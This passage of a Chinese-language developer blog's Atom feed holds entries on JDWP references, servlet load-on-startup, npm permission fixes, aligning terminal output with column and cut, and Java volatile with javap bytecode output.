rel="external nofollow noopener noreferrer" target="_blank">Java Platform Debugger Architecture</a></li><li><a href="https://docs.oracle.com/javase/7/docs/technotes/guides/jpda/jdwp-spec.html" rel="external nofollow noopener noreferrer" target="_blank">Java(tm) Debug Wire Protocol</a></li><li><a href="http://files.meetup.com/3189882/Java%20Debugger%20Internals.pdf" rel="external nofollow noopener noreferrer" target="_blank">Java Debugger Internals - Meetup</a></li><li><a href="https://_thorns.gitbooks.io/sec/content/java_debug_remote_code_execution.html" rel="external nofollow noopener noreferrer" target="_blank">Java Debug Remote Code Execution · 安全手册</a></li><li><a href="https://secwiki.org/w/FAQ_missing_port" rel="external nofollow noopener noreferrer" target="_blank">FAQ missing port - SecWiki</a></li><li><a href="https://github.com/IOActive/jdwp-shellifier" rel="external nofollow noopener noreferrer" target="_blank">IOActive/jdwp-shellifier</a></li><li><a href="https://ioactive.com/hacking-java-debug-wire-protocol-or-how/" rel="external nofollow noopener noreferrer" target="_blank">Hacking the Java Debug Wire Protocol - or - “How I met your Java debugger” | IOActive</a></li><li><a href="https://nmap.org/nsedoc/scripts/jdwp-exec.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-exec NSE Script</a></li><li><a href="https://nmap.org/nsedoc/scripts/jdwp-info.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-info NSE Script</a></li><li><a href="https://nmap.org/nsedoc/scripts/jdwp-inject.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-inject NSE Script</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;什么是JDWP？&quot;&gt;&lt;a href=&quot;#什么是JDWP？&quot; class=&quot;headerlink&quot; title=&quot;什么是JDWP？&quot;&gt;&lt;/a&gt;什么是JDWP？&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;JDWP（Java Debug Wire Protocol）是一个
      
    
    </summary>
    
      <category term="jvm" scheme="http://qsli.github.io/categories/jvm/"/>
    
    
      <category term="jdwp" scheme="http://qsli.github.io/tags/jdwp/"/>
    
  </entry>
  
  <entry>
    <title>web.xml</title>
    <link href="http://qsli.github.io/2018/08/11/web-xml/"/>
    <id>http://qsli.github.io/2018/08/11/web-xml/</id>
    <published>2018-08-11T12:42:43.012Z</published>
    <updated>2018-08-11T12:42:43.030Z</updated>
    
    <content type="html"><![CDATA[<h2 id="load-on-startup标签"><a href="#load-on-startup标签" class="headerlink" title="load-on-startup标签"></a>load-on-startup标签</h2><blockquote><p>Servlets are initialized either lazily at request processing time or eagerly during<br>deployment. In the latter case, they are initialized in the order indicated by<br>their load-on-startup elements.</p></blockquote><p>在web容器启动的时候，可以采用<code>lazily</code>加载的方式和<code>eagerly</code>的方式。</p><p><code>load-on-startup</code>中的值决定了进行哪种方式。</p><blockquote><p>If the value is a negative integer, or the element is not present, the<br>container is free to load the servlet whenever it chooses. If the value is a positive<br>integer or 0, the container must load and initialize the servlet as the application is<br>deployed.</p></blockquote><p>如果<load-on-startup>这个元素没有出现，或者出现了但是里面的值是负的，容器可以按照自己的需要选择加载Servlet的时机。</load-on-startup></p><p>如果里面的值是正数或者0，容器必须保证在容器启动的时候加载和初始化这个servlet</p><blockquote><p> The container must guarantee that servlets marked with lower integers<br>are loaded before servlets marked with higher integers.</p></blockquote><p>这个值越小，优先级越高，容器优先加载。</p><blockquote><p>The container may choose<br>the order of loading of servlets with the same load-on-startup value.</p></blockquote><p>如果里面的值是一样的，那么加载的顺序由容器来决定（不同实现可能不同）</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol><li>Java Servlet Specification 3.0</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;load-on-startup标签&quot;&gt;&lt;a href=&quot;#load-on-startup标签&quot; class=&quot;headerlink&quot; title=&quot;load-on-startup标签&quot;&gt;&lt;/a&gt;load-on-startup标签&lt;/h2&gt;&lt;blockquote&gt;

      
    
    </summary>
    
      <category term="tomcat" scheme="http://qsli.github.io/categories/tomcat/"/>
    
    
      <category term="servlet" scheme="http://qsli.github.io/tags/servlet/"/>
    
  </entry>
  
  <entry>
    <title>hexo迁移到ubuntu</title>
    <link href="http://qsli.github.io/2018/08/11/hexo-ubuntu/"/>
    <id>http://qsli.github.io/2018/08/11/hexo-ubuntu/</id>
    <published>2018-08-11T12:42:41.640Z</published>
    <updated>2018-08-11T12:42:41.640Z</updated>
    
    <content type="html"><![CDATA[<p>系统切换到ubuntu之后，使用的apt安装的node，默认权限是sudo。安装hexo之后也必须以sudo身份执行。<br>需要修改下node的权限，命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  qsli.github.com (hexo|✚1…)  npm config get prefix</span><br><span class="line">/usr/local</span><br></pre></td></tr></table></figure><p>修改owner</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chown -R $(whoami) $(npm config get prefix)/&#123;lib/node_modules,bin,share&#125;</span><br></pre></td></tr></table></figure><p>修改owner之后就可以正常执行hexo了。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://docs.npmjs.com/getting-started/fixing-npm-permissions" rel="external nofollow noopener noreferrer" target="_blank">03 - Fixing npm permissions | npm Documentation</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;系统切换到ubuntu之后，使用的apt安装的node，默认权限是sudo。安装hexo之后也必须以sudo身份执行。&lt;br&gt;需要修改下node的权限，命令如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td clas
      
    
    </summary>
    
      <category term="hexo" scheme="http://qsli.github.io/categories/hexo/"/>
    
    
      <category term="hexo" scheme="http://qsli.github.io/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>linux终端对齐问题</title>
    <link href="http://qsli.github.io/2018/07/11/column-view/"/>
    <id>http://qsli.github.io/2018/07/11/column-view/</id>
    <published>2018-07-10T16:59:00.000Z</published>
    <updated>2018-08-11T12:42:41.216Z</updated>
    
    <content type="html"><![CDATA[<h2 id="输出乱了"><a href="#输出乱了" class="headerlink" title="输出乱了?"></a>输出乱了?</h2><p>比如<code>vmstat</code>命令, 输出歪歪扭扭的, 强迫症简直不能忍啊, 而且看个指标还得先对齐下.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  vmstat 1 </span><br><span class="line">procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----</span><br><span class="line"> r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st</span><br><span class="line"> 0  0      0 4577556 281532 3674532    0    0    64    36  192  784  5  1 93  1  0</span><br><span class="line"> 0  0      0 4577992 281532 3674552    0    0     0     0  417 1089  1  1 98  0  0</span><br><span class="line"> 0  0      0 4577960 281540 3674532    0    0     0    44  401 1105  1  0 98  1  0</span><br><span class="line"> 2  0      0 4577960 281540 3674548    0    0     0     0  307  834  1  0 99  0  0</span><br><span class="line"> 0  0      0 4577960 281548 3674548    0    0     0    48  318  773  1  0 99  1  0</span><br></pre></td></tr></table></figure><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="其实-加个column就好了"><a href="#其实-加个column就好了" class="headerlink" title="其实, 加个column就好了"></a>其实, 加个<code>column</code>就好了</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  vmstat 1 5 | column -t</span><br><span class="line">procs  -----------memory----------  ---swap--  -----io----  -system--  ------cpu-----</span><br><span class="line">r      b                            swpd       free         buff       cache           si  so  bi  bo   in   cs    us  sy  id  wa  st</span><br><span class="line">5      0                            0          4565016      281996     3675732         0   0   63  36   192  784   5   1   93  1   0</span><br><span class="line">0      0                            0          4564836      281996     3675756         0   0   0   0    345  805   1   0   99  1   0</span><br><span class="line">0      0                            0          4564744      282004     3675736         0   0   0   88   489  1305  1   0   98  0   0</span><br><span class="line">2      0                            0          4565456      282004     3675736         0   0   0   0    401  1042  1   0   99  0   0</span><br><span class="line">0      0                            0          4566400      282016     3675736         0   0   0   132  823  2357  1   1   98  1   0</span><br></pre></td></tr></table></figure><p>整整齐齐啊, 神清气爽, 不过如果使用<code>vmstat 1 | column -t</code>就会没有任何输出,  <code>vmstat 1</code>相当于每一秒输出一行, <code>column -t</code>会一直傻傻地等着, 所以什么都看不到.</p><p>看下manual:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-t      Determine the number of columns the input contains and create a table.  Columns are delimited with whitespace, by default, or</span><br><span class="line">             with the characters supplied using the -s option.  Useful for pretty-printing displays.</span><br></pre></td></tr></table></figure><p>为了形式上的好看, 还是忍一忍吧.</p><h3 id="行太长了"><a href="#行太长了" class="headerlink" title="行太长了?"></a>行太长了?</h3><p>有的时候会遇到另外一种情况, 就是一行太长了, 这时候满屏都是花的, 比如下面这个:</p><img src="/2018/07/11/column-view/mess.png" title="终端中杂乱的输出"><p>终端中显示的是杂乱的, 但是整个复制出来就神奇的变好了(注意, 不要打开text wrapping)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@l-hpbreezep20.h.cn2 ~]$ cat /proc/softirqs </span><br><span class="line">                    CPU0       CPU1       CPU2       CPU3       CPU4       CPU5       CPU6       CPU7       CPU8       CPU9       CPU10      CPU11      CPU12      CPU13      CPU14      CPU15      CPU16      CPU17      CPU18      CPU19      CPU20      CPU21      CPU22      CPU23      CPU24      CPU25      CPU26      CPU27      CPU28      CPU29      CPU30      CPU31      </span><br><span class="line">          HI:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          6          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          1          0</span><br><span class="line">       TIMER:   43050851   44411905   43919992   42442914   43015809   42846597   42569992   41861589   48809346   43382044   43304198   43899929   46604992   49141675   43598221   44605969   36416696   40245419   43755210   38241174   40310482   36846535   40234221   36373316   37261964   40299828   40815229   48124964   38746814   40687667   39654342   44596933</span><br><span class="line">      NET_TX:     159131      57649        987        947       1124        960        887        897      53415      44445        907        982       5556      31456        921        928        604        665      58417        565       4375        615      16263        532        658        573      15546      23825        560       3679        537      11125</span><br><span class="line">      NET_RX:   54739232  104971608     175092     144098     287613     181637     274003     105699  137866529   37821843     114651       5258   31830654   74227300     149144      41791      32428      12501  136630455      80495   49754625     158541   30734583       3512       2284       2796   35459431  131330367      78501   89945954      50223  117038378</span><br><span class="line">       BLOCK:      81587     139726     179707     144663     159758     190601     132768     276230      72676     287984     130253     323938     152578     206060     141233     141074     193578     251093        448     131136      62687     150827     194672     388017      81603     163935     175096     166935     330730      47293     161579      54246</span><br><span class="line">BLOCK_IOPOLL:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0</span><br><span class="line">     TASKLET:    1675397    3309130       9569       4022       2764       5093       4897      10826    4444030    1454707       1496        286    1048531    2576975        811       2119        442        417    4300523        260    1552321        418    1015839      10748        510        218    1121876    4256900        115    3020283        287    3986726</span><br><span class="line">       SCHED:   15007043   12859515   11501051   11259112   10939612   10774900   10462556   10131094   14234569   10072702    9984370   10190600   11242845   12149746    9940021   10177032    6683735    7652871   10904532    7456442    9226435    7306446    8605291    6707082    6480350    7086698    8286905   11682767    7195542    8529887    7447246   10396247</span><br><span class="line">     HRTIMER:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0</span><br><span class="line">         RCU:   17206657   17427121   18015842   17756453   17731002   17874141   17772044   17467329   18480130   17666877   17975799   18291442   18971854   19696035   18311040   18486331   14653377   16665048   16695739   15810275   15832142   14999192   15912229   14669770   14782425   16825467   16554916   18592285   15670613   15416856   16010390   16910501</span><br></pre></td></tr></table></figure><p>wtf!!!</p><p>这时候就需要结合cut来发挥作用了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@l-hpbreezep20.h.cn2 ~]$ cat /proc/softirqs | column -t  | cut -c -160</span><br><span class="line">CPU0           CPU1      CPU2       CPU3      CPU4      CPU5      CPU6      CPU7      CPU8      CPU9       CPU10     CPU11     CPU12     CPU13     CPU14     CPU</span><br><span class="line">HI:            0         0          0         0         0         0         0         0         0          0         0         0         0         0         6  </span><br><span class="line">TIMER:         42897374  44265424   43773013  42294893  42872190  42703730  42422299  41715918  48651925   43219235  43155865  43751531  46455390  48993651  434</span><br><span class="line">NET_TX:        158851    57164      981       939       1119      956       882       894       53297      43884     904       980       5551      31451     917</span><br><span class="line">NET_RX:        54266774  104535675  175086    144094    287558    181540    273997    105609    137397792  37471099  114548    5252      31830477  74227296  149</span><br><span class="line">BLOCK:         81585     139726     179707    144265    159758    190245    132562    275983    72656      287710    130180    323916    152544    205625    140</span><br><span class="line">BLOCK_IOPOLL:  0         0          0         0         0         0         0         0         0          0         0         0         0         0         0  </span><br><span class="line">TASKLET:       1661705   3295175    9569      4022      2764      5093      4897      10826     4429925    1442145   1496      286       1048531   2576975   811</span><br><span class="line">SCHED:         14954535  12813884   11459036  11217505  10901019  10736479  10424577  10093709  14202602   10037804  9955899   10162495  11215015  12123529  991</span><br><span class="line">HRTIMER:       0         0          0         0         0         0         0         0         0          0         0         0         0         0         0  </span><br><span class="line">RCU:           17145747  17366996   17952484  17693839  17671645  17814624  17709279  17405994  18416537   17600989  17910864  18226002  18906471  19629970  182</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[qisheng.li@l-hpbreezep20.h.cn2 ~]$ cat /proc/softirqs | column -t  | cut -c 150-300</span><br><span class="line">U14     CPU15     CPU16     CPU17     CPU18     CPU19      CPU20     CPU21     CPU22     CPU23     CPU24     CPU25     CPU26     CPU27     CPU28      C</span><br><span class="line">        6         0         0         0         0          0         0         0         0         0         0         0         0         0          0</span><br><span class="line">030995  43485667  44493659  36326549  40157402  43631283   38151873  40219806  36756938  40144515  36283732  37161284  40199408  40717545  48006972   3</span><br><span class="line">451     917       925       601       662       58258      560       4373      614       16262     532       656       572       15544     23806      5</span><br><span class="line">227296  149142    41791     32391     12499     136276000  80492     49754624  158467    30734581  3506      2281      2795      35459426  131010842  7</span><br><span class="line">5644    140738    141074    192744    251010    448        130632    62646     150826    193938    387975    81598     163807    174560    166894     3</span><br><span class="line">        0         0         0         0         0          0         0         0         0         0         0         0         0         0          0</span><br><span class="line">76975   811       2119      442       417       4290461    260       1552321   418       1015839   10748     510       218       1121876   4247160    1</span><br><span class="line">130763  9918727   10155044  6665114   7634478   10872508   7435459   9208357   7287842   8584087   6687254   6464581   7069601   8268941   11657561   7</span><br><span class="line">        0         0         0         0         0          0         0         0         0         0         0         0         0         0          0</span><br><span class="line">645462  18260707  18436150  14614558  16626358  16648198   15772191  15794569  14960694  15874249  14631009  14737925  16781205  16511913  18544088   1</span><br><span class="line"></span><br><span class="line">[qisheng.li@l-hpbreezep20.h.cn2 ~]$ cat /proc/softirqs | column -t  | cut -c 290-</span><br><span class="line">PU28      CPU29     CPU30     CPU31</span><br><span class="line">          0         0         1         0</span><br><span class="line">8025761   38667794  40583340  39575602  44506422</span><br><span class="line">3810      555       3672      535       11121</span><br><span class="line">31059150  78501     89665808  50166     116771524</span><br><span class="line">66900     330730    47290     161396    54232</span><br><span class="line">          0         0         0         0</span><br><span class="line">248714    115       3012042   287       3978676</span><br><span class="line">1661902   7180114   8511025   7432308   10374288</span><br><span class="line">          0         0         0         0</span><br><span class="line">8550398   15634808  15373695  15974460  16871666</span><br></pre></td></tr></table></figure><p>整整齐齐才好看啊!<br>唉, <code>cpu</code>太多也是麻烦啊</p><h2 id="其他思路"><a href="#其他思路" class="headerlink" title="其他思路"></a>其他思路</h2><p>今天在<code>性能之巅</code>发现, <code>vmstat</code>支持列模式, <code>-s</code>可以按照列输出, <code>-Sm</code>修改输出的单位为<code>m</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  vmstat -asSm 1 </span><br><span class="line">        12500 m total memory</span><br><span class="line">         4053 m used memory</span><br><span class="line">         5919 m active memory</span><br><span class="line">         1883 m inactive memory</span><br><span class="line">         3940 m free memory</span><br><span class="line">          760 m buffer memory</span><br><span class="line">         3745 m swap cache</span><br><span class="line">         4294 m total swap</span><br><span class="line">            0 m used swap</span><br><span class="line">         4294 m free swap</span><br><span class="line">       606762 non-nice user cpu ticks</span><br><span class="line">         3887 nice user cpu ticks</span><br><span class="line">       140316 system cpu ticks</span><br><span class="line">      8108433 idle cpu ticks</span><br><span class="line">        91538 IO-wait cpu ticks</span><br><span class="line">            0 IRQ cpu ticks</span><br><span class="line">         3461 softirq cpu ticks</span><br><span class="line">            0 stolen cpu ticks</span><br><span class="line">      2775187 pages paged in</span><br><span class="line">      3731660 pages paged out</span><br><span class="line">            0 pages swapped in</span><br><span class="line">            0 pages swapped out</span><br><span class="line">     16443967 interrupts</span><br><span class="line">     81534611 CPU context switches</span><br><span class="line">   1532129612 boot time</span><br><span class="line">        39867 forks</span><br></pre></td></tr></table></figure><p>mysql也有对应的列模式:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select *  from hotel_order_simple limit 1;</span><br><span class="line">+------+-----------------+--------------+-------------+---------------+------------+---------------------+------------+-------------+----------+-----------+-------------+---------------------+</span><br><span class="line">| id   | uid             | order_no     | user_name   | contact_phone | card_index | create_date         | order_type | user_status | terminal | room_type | region_type | update_time         |</span><br><span class="line">+------+-----------------+--------------+-------------+---------------+------------+---------------------+------------+-------------+----------+-----------+-------------+---------------------+</span><br><span class="line">| 1109 | 66666666666666 | 66666666666666 | 66666666666666 | 66666666666666   |            | 2018-06-03 11:12:14 | 1005001    |      100070 | app      |         0 |           1 | 2018-06-04 20:09:56 |</span><br><span class="line">+------+-----------------+--------------+-------------+---------------+------------+---------------------+------------+-------------+----------+-----------+-------------+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">// 列模式</span><br><span class="line"></span><br><span class="line">mysql&gt; select *  from hotel_order_simple limit 1 \G;</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">           id: 1109</span><br><span class="line">          uid: 66666666666666</span><br><span class="line">     order_no: 66666666666666</span><br><span class="line">    user_name: 66666666666666</span><br><span class="line">contact_phone: 66666666666666</span><br><span class="line">   card_index: </span><br><span class="line">  create_date: 2018-06-03 11:12:14</span><br><span class="line">   order_type: 1005001</span><br><span class="line">  user_status: 100070</span><br><span class="line">     terminal: app</span><br><span class="line">    room_type: 0</span><br><span class="line">  region_type: 1</span><br><span class="line">  update_time: 2018-06-04 20:09:56</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">ERROR: </span><br><span class="line">No query specified</span><br></pre></td></tr></table></figure><p>所以, 有的时候多看看手册也不错.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;输出乱了&quot;&gt;&lt;a href=&quot;#输出乱了&quot; class=&quot;headerlink&quot; title=&quot;输出乱了?&quot;&gt;&lt;/a&gt;输出乱了?&lt;/h2&gt;&lt;p&gt;比如&lt;code&gt;vmstat&lt;/code&gt;命令, 输出歪歪扭扭的, 强迫症简直不能忍啊, 而且看个指标还得先对齐下.&lt;/
      
    
    </summary>
    
      <category term="linux" scheme="http://qsli.github.io/categories/linux/"/>
    
    
      <category term="format" scheme="http://qsli.github.io/tags/format/"/>
    
  </entry>
  
  <entry>
    <title>volatile</title>
    <link href="http://qsli.github.io/2018/07/08/volatile/"/>
    <id>http://qsli.github.io/2018/07/08/volatile/</id>
    <published>2018-07-08T14:59:50.000Z</published>
    <updated>2018-08-11T12:42:43.011Z</updated>
    
    <content type="html"><![CDATA[<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>volatile的作用:</p><p>1.保证多个线程”同时”修改”共享”变量时不会因为cpu cache等原因而造成不一致,  </p><p>2.另外的作用就是防止指令重排</p><h2 id="防止指令重排"><a href="#防止指令重排" class="headerlink" title="防止指令重排"></a>防止指令重排</h2><p><code>Double-Checked Locking</code>中实例必须可以通过加上<code>volatile</code>关键字来防止防止指令重排产生的影响.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Works with acquire/release semantics for volatile</span></span><br><span class="line"><span class="comment">// Broken under current semantics for volatile</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 注意必须是volatile</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">volatile</span> Helper helper = <span class="keyword">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Helper <span class="title">getHelper</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (helper == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (helper == <span class="keyword">null</span>)</span><br><span class="line">                        helper = <span class="keyword">new</span> Helper();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> helper;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><h3 id="字节码"><a href="#字节码" class="headerlink" title="字节码"></a>字节码</h3><p>查看编译后的字节码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">➜  jvm  javap -v -p  Foo</span><br><span class="line">Classfile /home/qishengli/test/jvm/Foo.class</span><br><span class="line">  Last modified Jul 8, 2018; size 521 bytes</span><br><span class="line">  MD5 checksum 1bacc25f9d4c0bf1b0b5c0f46172767f</span><br><span class="line">  Compiled from &quot;Foo.java&quot;</span><br><span class="line">class Foo</span><br><span class="line">  minor version: 0</span><br><span class="line">  major version: 52</span><br><span class="line">  flags: ACC_SUPER</span><br><span class="line">Constant pool:</span><br><span class="line">   #1 = Methodref          #6.#22         // java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">   #2 = Fieldref           #5.#23         // Foo.helper:LFoo$Helper;</span><br><span class="line">   #3 = Class              #24            // Foo$Helper</span><br><span class="line">   #4 = Methodref          #3.#25         // Foo$Helper.&quot;&lt;init&gt;&quot;:(LFoo;)V</span><br><span class="line">   #5 = Class              #26            // Foo</span><br><span class="line">   #6 = Class              #27            // java/lang/Object</span><br><span class="line">   #7 = Utf8               Helper</span><br><span class="line">   #8 = Utf8               InnerClasses</span><br><span class="line">   #9 = Utf8               helper</span><br><span class="line">  #10 = Utf8               LFoo$Helper;</span><br><span class="line">  #11 = Utf8               &lt;init&gt;</span><br><span class="line">  #12 = Utf8               ()V</span><br><span class="line">  #13 = Utf8               Code</span><br><span class="line">  #14 = Utf8               LineNumberTable</span><br><span class="line">  #15 = Utf8               getHelper</span><br><span class="line">  #16 = Utf8               ()LFoo$Helper;</span><br><span class="line">  #17 = Utf8               StackMapTable</span><br><span class="line">  #18 = Class              #27            // java/lang/Object</span><br><span class="line">  #19 = Class              #28            // java/lang/Throwable</span><br><span class="line">  #20 = Utf8               SourceFile</span><br><span class="line">  #21 = Utf8               Foo.java</span><br><span class="line">  #22 = NameAndType        #11:#12        // &quot;&lt;init&gt;&quot;:()V</span><br><span class="line">  #23 = NameAndType        #9:#10         // helper:LFoo$Helper;</span><br><span class="line">  #24 = Utf8               Foo$Helper</span><br><span class="line">  #25 = NameAndType        #11:#29        // &quot;&lt;init&gt;&quot;:(LFoo;)V</span><br><span class="line">  #26 = Utf8               Foo</span><br><span class="line">  #27 = Utf8               java/lang/Object</span><br><span class="line">  #28 = Utf8               java/lang/Throwable</span><br><span class="line">  #29 = Utf8               (LFoo;)V</span><br><span class="line">&#123;</span><br><span class="line">  private 